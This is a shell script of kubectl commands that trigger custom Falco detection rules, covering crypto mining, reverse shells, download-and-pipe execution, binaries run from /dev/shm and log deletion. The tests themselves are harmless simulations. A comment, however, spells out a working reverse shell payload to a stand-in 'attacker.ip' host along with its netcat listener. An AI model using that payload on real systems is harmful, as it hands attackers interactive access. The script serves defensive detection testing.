# ==============================================================================
# Commands to test each custom Falco malware rule individually
# ==============================================================================

# 1. Detect Crypto Miner Execution (Priority: CRITICAL -> #falco-minimumpriority-critical & #falco-minimumpriority-warning)
# Attack Type: Cryptojacking / Resource Hijacking (MITRE ATT&CK: T1496)
# Description: Attackers exploit container vulnerabilities to run unauthorized cryptocurrency miners
#              (e.g., xmrig, minerd), consuming 100% CPU/GPU and degrading legitimate cluster workloads.
# What it detects: Known mining pool protocols (stratum+tcp://, stratum+ssl://) or miner binary names.
kubectl run test-miner \
  --rm -i --restart=Never \
  --image=ubuntu:latest \
  -- bash -c 'echo "stratum+tcp://xmr.pool.com"'


# 2. Reverse Shell Spawned in Container (Priority: CRITICAL -> #falco-minimumpriority-critical & #falco-minimumpriority-warning)
# Attack Type: Interactive Foothold / Reverse Shell (MITRE ATT&CK: T1059)
# Description: Production containers should never initiate outbound connections from a shell. Attackers
#              use reverse shells to bypass inbound firewalls/NAT by having the container connect outward
#              to their listener machine on the internet, granting interactive shell access inside your network.
#
# Real-World Attack Scenario:
#   1. An attacker exploits a Remote Code Execution (RCE) flaw in your web app (e.g. command injection).
#   2. Attacker listens on their public machine: nc -lvnp 4444
#   3. Attacker sends injection payload to pod: bash -i >& /dev/tcp/attacker.ip/4444 0>&1
#   4. The pod connects OUTWARD to the attacker, handing them root terminal access inside your cluster!
#
# What does 'exec 3<>/dev/tcp/1.1.1.1/53' do?
#   - 'exec 3<>' opens custom file descriptor 3 in read/write mode.
#   - '/dev/tcp/HOST/PORT' is a special built-in Bash virtual file feature: when Bash sees this path,
#     it opens a direct raw TCP socket connection to HOST on that PORT.
#   - Here, it safely simulates an outbound network connection from Bash to 1.1.1.1:53 (Cloudflare DNS)
#     without installing netcat or running an actual malicious reverse shell backdoor.
#
# What it detects: An interactive shell (bash, sh, zsh) making an outbound network connection (connect syscall).
kubectl run test-revshell \
  --rm -i --restart=Never \
  --image=ubuntu:latest \
  -- bash -c 'exec 3<>/dev/tcp/1.1.1.1/53'


# 3. Download and Pipe Execution (Priority: WARNING -> #falco-minimumpriority-warning)
# Attack Type: Drive-by Payload Delivery / Dropper (MITRE ATT&CK: T1105 / T1059)
# Description: Attackers download malicious scripts from Command & Control (C2) servers and pipe them
#              directly into memory/shell without saving to disk (evading file-based scanners).
# What it detects: curl or wget commands directly piped into shell interpreters (| sh, | bash, | python).
kubectl run test-pipe \
  --rm -i --restart=Never \
  --image=curlimages/curl:latest \
  -- sh -c 'curl -s https://httpbin.org/get | sh -c "echo pipe test"'


# 4. Execution from Suspicious Directory (Priority: WARNING -> #falco-minimumpriority-warning)
# Attack Type: Defense Evasion / Binary Execution from Writable Temp Paths (MITRE ATT&CK: T1036)
# Description: Application containers usually have read-only root filesystems except for temp areas.
#              Attackers drop compiled exploit tools or malware into /tmp or /dev/shm (shared memory)
#              and execute them there instead of standard paths (/bin, /usr/bin).
# What it detects: Binaries or scripts executed from /tmp, /dev/shm, or /var/tmp.
kubectl run test-suspicious-dir \
  --rm -i --restart=Never \
  --image=ubuntu:latest \
  -- bash -c 'cp /bin/dash /dev/shm/mybin && /dev/shm/mybin -c "echo running from shm"'


# 5. Clear Shell History or System Logs (Priority: WARNING -> #falco-minimumpriority-warning)
# Attack Type: Anti-Forensics / Indicator Removal (MITRE ATT&CK: T1070)
# Description: After gaining access, attackers attempt to destroy audit logs (/var/log) or wipe shell
#              history (.bash_history) to conceal their presence and prevent investigation.
# What it detects: Commands deleting /var/log, shell history files, or running 'history -c'.
kubectl run test-clear-history \
  --rm -i --restart=Never \
  --image=ubuntu:latest \
  -- bash -c 'touch /var/log/test.log && rm -f /var/log/test.log'
